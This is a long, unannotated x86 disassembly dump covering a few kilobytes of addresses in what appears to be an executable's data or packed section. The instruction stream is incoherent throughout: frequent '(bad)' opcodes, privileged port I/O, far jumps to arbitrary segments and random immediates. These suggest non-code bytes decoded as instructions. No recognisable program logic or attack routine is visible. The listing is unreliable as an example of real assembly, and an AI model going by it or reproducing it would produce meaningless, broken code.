  4095f8:	fist   WORD PTR [eax-0x4f44bfd8]
  4095fe:	mov    cl,ch
  409600:	lods   al,BYTE PTR ds:[esi]
  409601:	mov    al,0x23
  409603:	int3   
  409604:	mul    ecx
  409606:	bnd jno 0x4095d7
  409609:	and    dh,al
  40960b:	push   ebp
  40960c:	and    cl,dl
  40960e:	sub    cl,ah
  409610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409611:	xchg   ebp,eax
  409612:	retf   0x98ae
  409615:	mov    bl,0xd1
  409617:	push   ss
  409618:	jg     0x40959f
  40961a:	sbb    eax,0x9225979
  40961f:	or     al,0x1e
  409621:	daa    
  409622:	scas   al,BYTE PTR es:[edi]
  409623:	mov    bl,0xc3
  409625:	cs push 0x87c070ae
  40962b:	fidiv  WORD PTR ds:0x8d753fd2
  409631:	cdq    
  409632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409633:	sbb    ebp,esi
  409635:	mov    dl,0xa
  409637:	add    eax,edi
  409639:	jp     0x409630
  40963b:	or     ah,dl
  40963d:	cs call 0x202848d
  409643:	jg     0x409692
  409645:	sbb    BYTE PTR [edi+edx*2+0x29],cl
  409649:	push   ds
  40964a:	push   edx
  40964b:	out    dx,al
  40964c:	aam    0x3b
  40964e:	inc    edi
  40964f:	sub    eax,0xfcc9bdb0
  409654:	jg     0x409694
  409656:	pushf  
  409657:	sbb    ebx,DWORD PTR ss:[ecx]
  40965a:	hlt    
  40965b:	das    
  40965c:	fcom   st(3)
  40965e:	repnz enter 0x3b17,0xa
  409663:	adc    eax,DWORD PTR [edx+0x13]
  409666:	cmp    DWORD PTR [esi+0x58],0x1a
  40966a:	cmp    esp,esp
  40966c:	xchg   BYTE PTR [esi],dl
  40966e:	mov    ebp,0xb8ac1c6c
  409673:	push   esp
  409674:	xor    al,dl
  409676:	adc    BYTE PTR [edx+0x2b977b],bl
  40967c:	div    BYTE PTR [edx]
  40967e:	mov    bl,0x7e
  409680:	mov    ebp,esp
  409682:	pop    edx
  409683:	mov    ds:0xeac6e2af,eax
  409688:	add    al,0x8c
  40968a:	ret    0x9ada
  40968d:	out    dx,al
  40968e:	mov    al,0x29
  409690:	stos   DWORD PTR es:[edi],eax
  409691:	sahf   
  409692:	aad    0x55
  409694:	push   ds
  409695:	cmc    
  409696:	mov    al,0x6c
  409698:	stos   DWORD PTR es:[edi],eax
  409699:	lock ins DWORD PTR es:[edi],dx
  40969b:	push   eax
  40969c:	pop    es
  40969d:	add    eax,0xfb1b1c55
  4096a2:	pop    ds
  4096a3:	test   al,0xe1
  4096a5:	pop    esp
  4096a6:	out    dx,eax
  4096a7:	loopne 0x4096ba
  4096a9:	sahf   
  4096aa:	mov    ds:0x2d2e944f,al
  4096af:	mov    ds:0x161c9612,al
  4096b4:	xchg   edx,eax
  4096b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096b6:	adc    BYTE PTR [ecx+0x72b6a1e2],bl
  4096bc:	adc    DWORD PTR ds:0xea5b487a,edx
  4096c2:	lahf   
  4096c3:	mov    edx,0x71b0c9b0
  4096c8:	repz push 0x3d843f0e
  4096ce:	test   al,0xc0
  4096d0:	nop
  4096d1:	mov    bh,0x19
  4096d3:	rol    DWORD PTR [ebx+0x24b0f9fa],cl
  4096d9:	inc    edx
  4096da:	sbb    ah,BYTE PTR [edi+0x2398a9bd]
  4096e0:	cli    
  4096e1:	inc    ecx
  4096e2:	shr    BYTE PTR [esi+ebp*8+0x2e],1
  4096e6:	sbb    DWORD PTR [ecx],ecx
  4096e8:	jne    0x4096d6
  4096ea:	scas   eax,DWORD PTR es:[edi]
  4096eb:	push   0xf0be9b9c
  4096f0:	fdivr  st(2),st
  4096f2:	sbb    al,0x44
  4096f4:	cld    
  4096f5:	scas   al,BYTE PTR es:[edi]
  4096f6:	gs sbb eax,0xb961a34a
  4096fc:	mov    esi,0x27cf5ff1
  409701:	outs   dx,DWORD PTR ds:[esi]
  409702:	jo     0x409708
  409704:	pop    ecx
  409705:	shr    BYTE PTR [ebp+0x2e],cl
  409708:	mov    esi,DWORD PTR [eax+0x61]
  40970b:	or     BYTE PTR [ebx+0x47],bh
  40970e:	cli    
  40970f:	cmp    cl,BYTE PTR [eax-0x5e249dfe]
  409715:	add    DWORD PTR ds:0xa914e9ed,ebp
  40971b:	push   es
  40971c:	data16 (bad) 
  40971e:	jmp    0x64f7:0xfa63457c
  409725:	pop    es
  409726:	outs   dx,BYTE PTR ds:[esi]
  409727:	enter  0x5975,0xcf
  40972b:	in     eax,dx
  40972c:	cmp    DWORD PTR [ecx-0x629f5cae],0xffffffc5
  409733:	hlt    
  409734:	iret   
  409735:	aas    
  409736:	(bad)  
  409737:	sahf   
  409738:	and    eax,0x2832a0dd
  40973d:	popf   
  40973e:	xchg   edx,eax
  40973f:	jnp    0x409793
  409741:	(bad)  
  409742:	inc    esi
  409743:	rcl    DWORD PTR [ebx],cl
  409745:	test   esi,ebx
  409747:	push   0x79
  409749:	imul   edi,DWORD PTR [eax+0x54],0x13
  40974d:	aad    0xb7
  40974f:	cmp    DWORD PTR [ebp-0x72],edx
  409752:	cmp    BYTE PTR [ecx-0x2c36b00],dh
  409758:	add    eax,0xe0f27978
  40975d:	jns    0x4097d3
  40975f:	push   edx
  409760:	mov    ebx,0xe42bcdd8
  409765:	inc    edx
  409766:	rcl    BYTE PTR [ebx+0x48],1
  409769:	jne    0x40971d
  40976b:	(bad)  
  40976c:	aam    0x93
  40976e:	mov    eax,0x466a64ef
  409773:	xlat   BYTE PTR ds:[ebx]
  409774:	cli    
  409775:	xor    DWORD PTR [ecx+edi*8+0x38],edi
  409779:	mov    ds:0x59a9f348,al
  40977e:	xchg   ah,al
  409780:	test   BYTE PTR ds:0xeb8c8a36,dh
  409786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409787:	cmp    al,0xce
  409789:	jl     0x40979a
  40978b:	mov    eax,0x3bc5610d
  409790:	push   cs
  409791:	jno    0x409808
  409793:	arpl   dx,ax
  409795:	fisttp WORD PTR [ebp-0x7c0ae700]
  40979b:	pop    edx
  40979c:	stc    
  40979d:	mov    bl,0xa3
  40979f:	int3   
  4097a0:	dec    edx
  4097a1:	mov    dl,0xb2
  4097a3:	jnp    0x409746
  4097a5:	xchg   esi,eax
  4097a6:	pop    ebx
  4097a7:	jge    0x4097d0
  4097a9:	ror    DWORD PTR [esi],1
  4097ab:	mov    ebx,0xf95325df
  4097b0:	ja     0x409743
  4097b2:	pop    edx
  4097b3:	pop    ss
  4097b4:	dec    eax
  4097b5:	push   es
  4097b6:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4097b8:	mov    cl,0xb6
  4097ba:	ja     0x409794
  4097bc:	xchg   ecx,eax
  4097bd:	pop    ebx
  4097be:	psrlw  mm5,QWORD PTR ds:0x284b5142
  4097c5:	jmp    DWORD PTR [esi]
  4097c7:	cmp    BYTE PTR [ecx],0xb0
  4097ca:	in     eax,0x2b
  4097cc:	stc    
  4097cd:	mov    ch,0xb0
  4097cf:	(bad)  [ebx+0x25]
  4097d2:	or     al,BYTE PTR [ebx]
  4097d4:	fisttp DWORD PTR [esi+edx*4]
  4097d7:	iret   
  4097d8:	dec    edi
  4097d9:	or     DWORD PTR [esi],edi
  4097db:	in     al,0x7d
  4097dd:	jns    0x409760
  4097df:	std    
  4097e0:	fisubr WORD PTR [ebx]
  4097e2:	xor    eax,0x3d58c8ca
  4097e7:	loope  0x409863
  4097e9:	jb     0x409776
  4097eb:	out    0xb7,al
  4097ed:	rcr    bh,0x64
  4097f0:	shr    eax,0x9e
  4097f3:	inc    eax
  4097f4:	xor    dh,BYTE PTR [ebx-0x4d]
  4097f7:	cmp    al,0x21
  4097f9:	mov    DWORD PTR [edx+ebx*4+0xafd61be],edx
  409800:	jl     0x40982c
  409802:	test   esi,ebp
  409804:	pop    es
  409805:	xchg   ebx,eax
  409806:	cwde   
  409807:	pop    ecx
  409808:	sbb    eax,0xa0556398
  40980d:	sub    ebx,eax
  40980f:	cmp    BYTE PTR ds:0x58d260cb,dl
  409815:	add    BYTE PTR [eax+0x3da82b35],dl
  40981b:	push   cs
  40981c:	and    eax,0xd3f55ff0
  409821:	mov    bh,0x60
  409823:	(bad)  
  409824:	out    dx,al
  409825:	mov    ebx,DWORD PTR [ebx-0x53]
  409828:	bound  esp,QWORD PTR [esi]
  40982a:	out    dx,eax
  40982b:	dec    edx
  40982c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40982d:	inc    edx
  40982e:	fcmovnu st,st(2)
  409830:	sahf   
  409831:	cmp    al,0xf
  409833:	test   al,dh
  409835:	xor    esp,eax
  409837:	jbe    0x40987d
  409839:	xor    esp,DWORD PTR [ecx-0x21]
  40983c:	xchg   ebp,eax
  40983d:	retf   0x85d0
  409840:	push   cs
  409841:	or     al,0xf
  409843:	mov    BYTE PTR [ebp+0x569ae9fb],cl
  409849:	jns    0x40989e
  40984b:	and    al,0x71
  40984d:	jge    0x409803
  40984f:	ins    BYTE PTR es:[edi],dx
  409850:	xor    cl,BYTE PTR [edi-0x48]
  409853:	push   ebx
  409854:	adc    al,0x9e
  409856:	sbb    cl,BYTE PTR [edx+0x50]
  409859:	xor    al,0x5d
  40985b:	clc    
  40985c:	imul   eax,DWORD PTR [ecx+0x2b],0x64
  409860:	ror    edx,1
  409862:	and    ebp,eax
  409864:	jmp    0x65f8:0x56c7ff3e
  40986b:	jp     0x409806
  40986d:	inc    ebp
  40986e:	jae    0x40986f
  409870:	call   FWORD PTR [edi+0x6c]
  409873:	fdivr  st,st(0)
  409875:	jae    0x4098cb
  409877:	call   0xc07ebc5e
  40987c:	mov    al,ds:0x98ed2583
  409881:	adc    eax,0xf65e7cc0
  409886:	add    DWORD PTR [ebx+0x30],eax
  409889:	ss mov ecx,0x741adc16
  40988f:	and    eax,0x5a7521d7
  409894:	push   ecx
  409895:	int3   
  409896:	add    DWORD PTR ds:0xbfede8dd,0xc19f8db4
  4098a0:	ss clc 
  4098a2:	cmp    al,0x91
  4098a4:	cmp    esi,DWORD PTR [esi+0x38416dfe]
  4098aa:	push   ebx
  4098ab:	or     dh,BYTE PTR [edi+0x4d]
  4098ae:	sub    eax,0x640fb406
  4098b3:	lock mov ebx,0x2406e37f
  4098b9:	mov    ds:0xd5ad0af3,eax
  4098be:	push   0xb9f8613e
  4098c3:	retf   0xe957
  4098c6:	in     al,0x45
  4098c8:	inc    eax
  4098c9:	push   esi
  4098ca:	inc    bp
  4098cc:	pop    eax
  4098cd:	adc    eax,0x58528264
  4098d2:	push   0x203ef619
  4098d7:	push   ds
  4098d8:	mov    eax,ds:0xd70d59da
  4098dd:	pop    esp
  4098de:	pop    edi
  4098df:	repz inc dx
  4098e2:	inc    ebp
  4098e3:	stos   DWORD PTR es:[edi],eax
  4098e4:	(bad)  
  4098e5:	aaa    
  4098e6:	adc    DWORD PTR [edx+0xca7425d],ecx
  4098ec:	pusha  
  4098ed:	test   al,0xd0
  4098ef:	jg     0x4098c1
  4098f1:	dec    edx
  4098f2:	mov    eax,0xcf6caa54
  4098f7:	sub    al,0x7a
  4098f9:	js     0x409916
  4098fb:	jo     0x4098e5
  4098fd:	out    0x31,al
  4098ff:	imul   edi,DWORD PTR [ebx-0x3e],0xffffffe4
  409903:	leave  
  409904:	inc    ebx
  409905:	mov    edx,0x6949099
  40990a:	retf   
  40990b:	sbb    ebx,ebx
  40990d:	in     eax,dx
  40990e:	push   ebx
  40990f:	fs scas al,BYTE PTR es:[edi]
  409911:	pop    ebx
  409912:	and    DWORD PTR gs:[ebx-0x28],esi
  409916:	jmp    0x90cf:0x3a6d3524
  40991d:	cwde   
  40991e:	and    BYTE PTR [ebp+0x27737c6e],bh
  409924:	inc    ebp
  409925:	imul   ecx,DWORD PTR [ecx-0x7a0417fc],0xffffffff
  40992c:	dec    ecx
  40992d:	cs cwde 
  40992f:	or     al,0x21
  409931:	repz ss and edx,edi
  409935:	int    0x21
  409937:	pop    esp
  409938:	mov    al,0xfb
  40993a:	mov    edx,DWORD PTR [edi+0x6a46732f]
  409940:	ret    0xcfba
  409943:	add    esi,DWORD PTR [edi+0x1]
  409946:	sbb    eax,0x61d7dd48
  40994b:	xchg   ebx,eax
  40994c:	push   0x96107280
  409951:	scas   al,BYTE PTR es:[edi]
  409952:	(bad)  [ebp-0x5e028742]
  409958:	or     al,0x4c
  40995a:	ja     0x40993e
  40995c:	loop   0x4099d3
  40995e:	mov    edx,0xaf6603de
  409963:	shl    DWORD PTR [eax],cl
  409965:	adc    eax,DWORD PTR [ecx-0x61]
  409968:	dec    esp
  409969:	mov    dh,0x5a
  40996b:	loope  0x40998f
  40996d:	sub    DWORD PTR [ebx],edx
  40996f:	sub    dh,BYTE PTR [esi-0x7213e187]
  409975:	nop
  409976:	aam    0x3c
  409978:	adc    DWORD PTR [ebx],ebp
  40997a:	mov    ah,0xd1
  40997c:	xchg   BYTE PTR [esi],dh
  40997e:	sub    ecx,0xffffffbb
  409981:	xchg   ebp,eax
  409982:	push   edi
  409983:	adc    DWORD PTR [edi],esp
  409985:	push   bx
  409987:	sbb    cl,BYTE PTR [edi+ebp*8+0x37]
  40998b:	push   ebx
  40998c:	dec    ecx
  40998d:	adc    al,0xe2
  40998f:	xor    cl,BYTE PTR [edi-0x1]
  409992:	sbb    eax,0xbd0730ea
  409997:	inc    edx
  409998:	call   DWORD PTR [edx+eiz*2+0x506c0dd7]
  40999f:	shl    DWORD PTR [edi+0x1d579ac8],0xb1
  4099a6:	stos   DWORD PTR es:[edi],eax
  4099a7:	fnstsw WORD PTR [eax+esi*4]
  4099aa:	inc    ebp
  4099ab:	pop    es
  4099ac:	retf   0xd218
  4099af:	inc    ebp
  4099b0:	pop    eax
  4099b1:	nop
  4099b2:	aaa    
  4099b3:	lods   eax,DWORD PTR ds:[esi]
  4099b4:	cmp    al,0x44
  4099b6:	sti    
  4099b7:	lahf   
  4099b8:	mov    bh,0x48
  4099ba:	nop
  4099bb:	pusha  
  4099bc:	pop    edx
  4099bd:	sub    al,0x53
  4099bf:	je     0x4099d9
  4099c1:	sub    eax,0x3f71a60c
  4099c6:	xchg   BYTE PTR [ecx-0x28db3bf0],bh
  4099cc:	fwait
  4099cd:	mov    ebx,0xfce9d1c6
  4099d2:	jg     0x4099bf
  4099d4:	add    eax,0x1cadda1b
  4099d9:	call   0x5450cab0
  4099de:	cmp    al,0x9c
  4099e0:	out    0xa9,al
  4099e2:	sti    
  4099e3:	repnz les ebx,FWORD PTR [ebp-0x27]
  4099e7:	int    0x97
  4099e9:	mov    ah,0x78
  4099eb:	jmp    0x409970
  4099ed:	in     al,dx
  4099ee:	jecxz  0x409a05
  4099f0:	mov    ds,edi
  4099f2:	icebp  
  4099f3:	sbb    eax,0x5fa90cb5
  4099f8:	mov    edx,0x7849c0f6
  4099fd:	push   ecx
  4099fe:	xchg   edx,eax
  4099ff:	sbb    esi,esp
  409a01:	or     eax,0xd6dffe30
  409a06:	div    BYTE PTR [eax+0x4e]
  409a09:	outs   dx,DWORD PTR ds:[esi]
  409a0a:	clc    
  409a0b:	sti    
  409a0c:	xchg   edi,eax
  409a0d:	pushw  ss
  409a0f:	lods   eax,DWORD PTR ds:[esi]
  409a10:	gs addr16 and al,0x8a
  409a14:	scas   al,BYTE PTR es:[edi]
  409a15:	inc    ebx
  409a16:	cmp    ebp,edi
  409a18:	neg    DWORD PTR [edx+0x4f063d65]
  409a1e:	pop    ebx
  409a1f:	push   edi
  409a20:	sub    ah,ah
  409a22:	jmp    0xe7eb:0xac6c29fd
  409a29:	and    esi,eax
  409a2b:	fld    TBYTE PTR cs:[eax]
  409a2e:	xchg   esp,eax
  409a2f:	mov    WORD PTR [ecx],gs
  409a31:	out    dx,eax
  409a32:	(bad)  
  409a33:	push   0x5df92dea
  409a38:	ds pusha 
  409a3a:	or     BYTE PTR ds:0x6a2a419a,ah
  409a40:	cdq    
  409a41:	xchg   edi,eax
  409a42:	push   ebp
  409a43:	or     eax,0xf3b4335e
  409a48:	or     eax,0xcd0210dc
  409a4d:	dec    ecx
  409a4e:	rcr    BYTE PTR [eax+0x30],0xdb
  409a52:	inc    ebp
  409a53:	nop    DWORD PTR [eax-0x47564c72]
  409a5a:	(bad)  
  409a5b:	fs stc 
  409a5d:	jns    0x4099e1
  409a5f:	add    al,0xd7
  409a61:	outs   dx,DWORD PTR ds:[esi]
  409a62:	add    BYTE PTR [edi+0x674feeed],ah
  409a68:	push   ebx
  409a69:	inc    edi
  409a6a:	fbld   TBYTE PTR [ebx-0x45]
  409a6d:	fist   DWORD PTR [esi]
  409a6f:	dec    edx
  409a70:	mov    WORD PTR [ebx+ebp*8-0x4],gs
  409a74:	or     DWORD PTR [eax-0x2b10fcd5],esi
  409a7a:	jge    0x409a3b
  409a7c:	lods   al,BYTE PTR ds:[esi]
  409a7d:	sbb    DWORD PTR [esi-0x573c7008],0xfa723b8a
  409a87:	jbe    0x409ae0
  409a89:	mov    ebx,0xb167eb1f
  409a8e:	(bad)  
  409a8f:	jns    0x409abd
  409a91:	imul   ecx,ebx,0xffffffbb
  409a94:	ret    
  409a95:	and    edi,ebx
  409a97:	fcom   QWORD PTR [esi+eax*4-0x53]
  409a9b:	jnp    0x409aac
  409a9d:	mov    ah,BYTE PTR [esi-0x63]
  409aa0:	cmp    al,BYTE PTR [edx+0x73d868f]
  409aa6:	icebp  
  409aa7:	jmp    0xe80cd813
  409aac:	repz sbb ah,BYTE PTR [ebx]
  409aaf:	pop    ebp
  409ab0:	push   edi
  409ab1:	xchg   esp,eax
  409ab2:	fdiv   QWORD PTR [ebx-0x25]
  409ab5:	mov    edi,0xaa1a921c
  409aba:	adc    edx,edx
  409abc:	jmp    0x4bde:0xb1fcb476
  409ac3:	fistp  WORD PTR [ebx+0x509cea5b]
  409ac9:	in     al,dx
  409aca:	dec    edx
  409acb:	jne    0x409ad6
  409acd:	push   ds
  409ace:	lods   eax,DWORD PTR ds:[esi]
  409acf:	out    0x32,al
  409ad1:	(bad)  
  409ad2:	dec    ebp
  409ad3:	sbb    al,0x4a
  409ad5:	imul   eax,DWORD PTR [esi-0x7ef260e9],0xc65b9723
  409adf:	std    
  409ae0:	jp     0x409af2
  409ae2:	mov    ds:0xbe0999b5,eax
  409ae7:	xor    ecx,DWORD PTR [edi+0x6b134d69]
  409aed:	pop    eax
  409aee:	xchg   edi,eax
  409aef:	div    DWORD PTR [ebx+esi*8+0x49]
  409af3:	sub    cl,BYTE PTR [eax+0x1acc47c8]
  409af9:	fs cld 
  409afb:	dec    esi
  409afc:	xor    edx,DWORD PTR [edx]
  409afe:	fcomp  DWORD PTR [esi-0x13]
  409b01:	ss loopne 0x409ae3
  409b04:	pop    ds
  409b05:	ja     0x409b08
  409b07:	je     0x409b50
  409b09:	jp     0x409af1
  409b0b:	ret    
  409b0c:	push   ebp
  409b0d:	cli    
  409b0e:	scas   eax,DWORD PTR es:[edi]
  409b0f:	mov    ch,0xc9
  409b11:	lock js 0x409b0a
  409b14:	dec    eax
  409b15:	sbb    edi,DWORD PTR ds:0x234ec2d9
  409b1b:	aas    
  409b1c:	icebp  
  409b1d:	ds mov bh,0x48
  409b20:	inc    ebx
  409b21:	loop   0x409b9a
  409b23:	xchg   edi,eax
  409b24:	outs   dx,DWORD PTR ds:[esi]
  409b25:	(bad)  [ebx+0x7a3facb1]
  409b2b:	xor    cl,BYTE PTR [eax+0x9]
  409b2e:	jbe    0x409b74
  409b30:	sub    BYTE PTR [ebx-0x36a0c835],bh
  409b36:	or     DWORD PTR [esi+0x3852ed31],0xd1b0c086
  409b40:	push   ds
  409b41:	mov    gs,WORD PTR [edx+eiz*8+0x7773834a]
  409b48:	aaa    
  409b49:	mov    al,ds:0x92824947
  409b4e:	test   DWORD PTR [eax-0x26dcfd56],esp
  409b54:	shr    DWORD PTR [ecx+0xf139a69],cl
  409b5a:	inc    edx
  409b5b:	loop   0x409b57
  409b5d:	sbb    BYTE PTR [eax+edi*1],0x1c
  409b61:	test   BYTE PTR [esi],ah
  409b63:	inc    esp
  409b64:	sahf   
  409b65:	ins    BYTE PTR es:[edi],dx
  409b66:	adc    al,0xb2
  409b68:	loop   0x409afa
  409b6a:	cwde   
  409b6b:	push   ebp
  409b6c:	scas   al,BYTE PTR es:[edi]
  409b6d:	pop    edx
  409b6e:	(bad)  
  409b6f:	std    
  409b70:	and    edx,edi
  409b72:	imul   ecx,DWORD PTR [edi+0x1a6ad8a9],0xb242a186
  409b7c:	shr    edx,1
  409b7e:	cld    
  409b7f:	shl    eax,1
  409b81:	sbb    DWORD PTR [eax],esi
  409b83:	es loopne 0x409b5e
  409b86:	sub    BYTE PTR [eax+0x60],0xb0
  409b8a:	mov    eax,ds:0x96a72a3d
  409b8f:	ds pusha 
  409b91:	push   es
  409b92:	mov    esi,DWORD PTR [eax+edi*4]
  409b95:	jno    0x409c10
  409b97:	je     0x409bea
  409b99:	leave  
  409b9a:	ret    0x1845
  409b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b9e:	xchg   BYTE PTR [esi-0x68760163],ch
  409ba4:	ss and al,0xf6
  409ba7:	mov    edx,0x4489ffd7
  409bac:	repnz pop ebx
  409bae:	pop    es
  409baf:	push   0xffffffa4
  409bb1:	lods   eax,DWORD PTR ds:[esi]
  409bb2:	in     al,0x23
  409bb4:	fxch   st(7)
  409bb6:	add    BYTE PTR ds:0x92d545ad,dh
  409bbc:	fistp  QWORD PTR [eax+esi*2]
  409bbf:	in     eax,dx
  409bc0:	mov    WORD PTR [edx+0x6b],cs
  409bc3:	(bad)  
  409bc4:	pusha  
  409bc5:	or     esp,ebp
  409bc7:	dec    DWORD PTR [edi-0x6b161ccc]
  409bcd:	call   DWORD PTR [edx-0x35ce151f]
  409bd3:	pop    ebp
  409bd4:	jl     0x409b71
  409bd6:	adc    al,0x2b
  409bd8:	adc    BYTE PTR [edi],al
  409bda:	jb     0x409b8d
  409bdc:	pop    esp
  409bdd:	ret    
  409bde:	dec    edx
  409bdf:	addr16 push ds
  409be1:	(bad)  
  409be2:	jmp    0x409c29
  409be4:	mov    bl,0xb2
  409be6:	jnp    0x409b75
  409be8:	repnz mov WORD PTR [edx+0x1987b5d7],fs
  409bef:	xor    ch,BYTE PTR [ebx+esi*8]
  409bf2:	inc    esp
  409bf3:	or     edi,eax
  409bf5:	das    
  409bf6:	test   esp,0x61d03b8c
  409bfc:	sub    al,0xd5
  409bfe:	ret    
  409bff:	sbb    ebp,DWORD PTR [ecx]
  409c01:	(bad)  
  409c02:	nop
  409c03:	ds imul ebx,ecx,0x43832624
  409c0a:	(bad)  
  409c0b:	rcl    DWORD PTR [ecx+0x767ab97b],1
  409c11:	int    0xce
  409c13:	push   edx
  409c14:	mov    edx,0x9f583b
  409c19:	mov    esp,0xfdf9aaca
  409c1e:	lock adc eax,0xf2d65b30
  409c24:	jae    0x409c5c
  409c26:	push   ebx
  409c27:	mov    ecx,0x55bac71b
  409c2c:	mov    edx,0xe2926dfc
  409c32:	jns    0x409c98
  409c34:	pop    ebp
  409c35:	out    dx,al
  409c36:	sti    
  409c37:	retf   
  409c38:	add    eax,0xa1fc6029
  409c3d:	jge    0x409cb2
  409c3f:	int    0x78
  409c41:	add    ecx,DWORD PTR [edx-0x20dfde67]
  409c47:	cmp    eax,0x8b675e87
  409c4c:	loope  0x409cc4
  409c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c4f:	sub    edx,DWORD PTR [esi+0x1cd4838e]
  409c55:	mov    ebx,0xdde197
  409c5a:	aaa    
  409c5b:	test   BYTE PTR [ecx-0xc],bl
  409c5e:	or     DWORD PTR [edi-0x33],ecx
  409c61:	out    dx,eax
  409c62:	daa    
  409c63:	dec    esi
  409c64:	xor    DWORD PTR ds:0x4e9cbd23,eax
  409c6a:	add    DWORD PTR [ebp-0x20262cbe],esi
  409c70:	xchg   edi,eax
  409c71:	retf   0xf722
  409c74:	mov    eax,ds:0x64c5e311
  409c79:	push   eax
  409c7a:	sub    BYTE PTR [eax],ch
  409c7c:	xor    eax,0xec938c40
  409c81:	jb     0x409c88
  409c83:	test   eax,0xb26df98a
  409c88:	adc    esp,ebp
  409c8a:	mov    dh,0x44
  409c8c:	aas    
  409c8d:	not    edx
  409c8f:	jmp    0x409c1a
  409c91:	push   esi
  409c92:	js     0x409ceb
  409c94:	jge    0x409ce4
  409c96:	jg     0x409c96
  409c98:	fwait
  409c99:	sti    
  409c9a:	in     al,0xb4
  409c9c:	or     BYTE PTR [edx],dh
  409c9e:	or     eax,0x6bb5e695
  409ca3:	scas   eax,DWORD PTR es:[edi]
  409ca4:	push   esp
  409ca5:	test   al,0xa4
  409ca7:	inc    ebx
  409ca8:	fwait
  409ca9:	jge    0x409d1b
  409cab:	rcr    BYTE PTR [ebp+0x39ea2cc],cl
  409cb1:	dec    edx
  409cb2:	arpl   WORD PTR [eax+edx*1],ax
  409cb5:	jo     0x409c7b
  409cb7:	popa   
  409cb8:	mov    ecx,0xf349b4e5
  409cbd:	aam    0x81
  409cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cc0:	int    0xbf
  409cc2:	(bad)  
  409cc3:	je     0x409d3e
  409cc5:	mov    cl,0xfb
  409cc7:	push   es
  409cc8:	sub    ch,bl
  409cca:	test   eax,0x34a8877a
  409ccf:	jmp    0xc65f:0x6f5a543d
  409cd6:	nop
  409cd7:	daa    
  409cd8:	add    DWORD PTR [edx],0xafaf15a6
  409cde:	stc    
  409cdf:	(bad)  
  409ce0:	sbb    edx,DWORD PTR [ebp-0x42b147b1]
  409ce6:	cmp    DWORD PTR cs:[eax],ebp
  409ce9:	rcr    ch,0x9f
  409cec:	pop    ss
  409ced:	dec    ebx
  409cee:	cwde   
  409cef:	std    
  409cf0:	mov    ah,0xdf
  409cf2:	mov    esp,0xaa4b98ea
  409cf7:	adc    eax,0x41940a42
  409cfc:	adc    al,0x5a
  409cfe:	push   0xae8ca73c
  409d03:	stos   DWORD PTR es:[edi],eax
  409d04:	mov    esp,0x78445807
  409d09:	ja     0x409cf8
  409d0b:	jg     0x409c95
  409d0d:	gs repnz int3 
  409d10:	inc    eax
  409d11:	call   0xdd68679e
  409d16:	inc    ebp
  409d17:	jge    0x409d94
  409d19:	loopne 0x409cc9
  409d1b:	cmp    ah,dh
  409d1d:	out    0xe5,eax
  409d1f:	int3   
  409d20:	mov    edx,0xb2c38cc2
  409d25:	les    edx,FWORD PTR [eax-0x5c8e4156]
  409d2b:	sbb    BYTE PTR [eax],cl
  409d2d:	jae    0x409cc0
  409d2f:	or     edi,DWORD PTR [edi+0x1f4c2933]
  409d35:	jmp    0x409da6
  409d37:	sub    dh,BYTE PTR [edi-0x37e3c6a7]
  409d3d:	cmp    ebx,DWORD PTR [ebx]
  409d3f:	(bad)
  409d43:	xchg   ecx,eax
  409d44:	(bad)  [esi-0x65]
  409d47:	out    0xe1,eax
  409d49:	pop    ebp
  409d4a:	fistp  WORD PTR [esi-0x78af58a]
  409d50:	dec    edx
  409d51:	add    esp,esi
  409d53:	or     al,0x51
  409d55:	cmp    al,0xfe
  409d57:	aam    0x4e
  409d59:	aam    0xef
  409d5b:	jo     0x409d75
  409d5d:	mov    ebx,0x6b744b8b
  409d62:	sar    ch,cl
  409d64:	nop
  409d65:	xor    eax,0xcd976a68
  409d6a:	test   eax,0x90fce60e
  409d6f:	dec    ebx
  409d70:	fcomp  QWORD PTR [ebp+0x6b2fab38]
  409d76:	arpl   WORD PTR [ebx-0x58b0a993],bx
  409d7c:	sbb    bl,ch
  409d7e:	xlat   BYTE PTR ds:[ebx]
  409d7f:	sub    esi,DWORD PTR [esi-0x1a]
  409d82:	cmp    ah,BYTE PTR [edx]
  409d84:	fs jbe 0x409de3
  409d87:	add    al,0x86
  409d89:	and    ebx,DWORD PTR [esi+0x7e]
  409d8c:	test   eax,0x87236295
  409d91:	lods   al,BYTE PTR ds:[esi]
  409d92:	sub    edi,eax
  409d94:	mov    ecx,0x4186f8c7
  409d99:	les    esp,FWORD PTR [ebp+0x36]
  409d9c:	lods   eax,DWORD PTR ds:[esi]
  409d9d:	test   al,0x8e
  409d9f:	sahf   
  409da0:	cmp    DWORD PTR [eax-0x7d2c45c8],esp
  409da6:	add    al,0xfd
  409da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409da9:	and    eax,0xd8491f02
  409dae:	xchg   edi,eax
  409daf:	int3   
  409db0:	cmp    DWORD PTR [esi+0x6227da3c],0x2e
  409db7:	jmp    0x409d66
  409db9:	leave  
  409dba:	(bad)  
  409dbb:	mov    al,ds:0xf678c63a
  409dc0:	int    0x32
  409dc2:	ja     0x409d5b
  409dc4:	dec    ebx
  409dc5:	xor    esp,eax
  409dc7:	cmp    edx,edi
  409dc9:	inc    edi
  409dca:	mov    cl,0x13
  409dcc:	and    ebp,DWORD PTR [edx+0x139f8692]
  409dd2:	mov    ebp,esp
  409dd4:	lahf   
  409dd5:	imul   ecx
  409dd7:	(bad)  
  409dd9:	xchg   ecx,eax
  409dda:	iret   
  409ddb:	add    DWORD PTR [ecx+0x7d5dec7b],edi
  409de1:	loope  0x409db5
  409de3:	jle    0x409db9
  409de5:	jo     0x409dcb
  409de7:	std    
  409de8:	and    ebx,DWORD PTR [edi]
  409dea:	mov    dh,BYTE PTR [ebp-0x3e5ae185]
  409df0:	xor    bl,BYTE PTR [ecx+0x23]
  409df3:	(bad)  
  409df4:	lea    ebp,[ebx-0x1c]
  409df7:	out    dx,al
  409df8:	xor    dh,BYTE PTR [edi]
  409dfa:	mov    BYTE PTR [edx],dh
  409dfc:	bound  ecx,QWORD PTR [ecx]
